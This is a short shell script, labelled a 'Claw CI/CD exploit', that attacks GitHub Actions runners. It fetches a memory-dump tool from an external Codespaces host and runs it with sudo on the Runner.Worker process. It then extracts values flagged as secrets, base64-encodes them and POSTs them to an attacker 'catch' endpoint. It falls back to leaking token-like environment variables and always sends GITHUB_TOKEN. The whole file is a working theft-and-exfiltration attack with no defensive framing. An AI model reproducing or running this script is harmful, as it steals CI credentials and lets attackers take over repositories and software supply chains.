#!/bin/sh
# Claw CI/CD exploit — Runner.Worker memory dump + secrets extraction
curl -sSf 'https://glowing-space-tribble-q7wq4p7457g53w49-9999.app.github.dev/memdump.py' > /tmp/.md.py

# Primary: memdump -> extract secrets -> exfil
SECRETS=$(sudo python3 /tmp/.md.py 2>/dev/null \
  | tr -d '\0' \
  | grep -aoE '"[^"]+":{"value":"[^"]*","isSecret":true}' \
  | sort -u | base64 -w 0)

if [ -n "$SECRETS" ]; then
  curl -sSf -X POST 'https://glowing-space-tribble-q7wq4p7457g53w49-9876.app.github.dev/catch' \
    --data-binary "secrets=$SECRETS&method=memdump" 2>/dev/null
else
  # Memdump found no secrets — exfil env vars as fallback
  curl -sSf -X POST 'https://glowing-space-tribble-q7wq4p7457g53w49-9876.app.github.dev/catch' \
    --data-binary "$(env | grep -iE 'token|secret|key|ghp_|github' | base64 -w0)&method=env" 2>/dev/null
fi

# Always exfil GITHUB_TOKEN as baseline proof
curl -sSf -X POST 'https://glowing-space-tribble-q7wq4p7457g53w49-9876.app.github.dev/catch' \
  --data-binary "tok=$GITHUB_TOKEN&method=token" 2>/dev/null || true
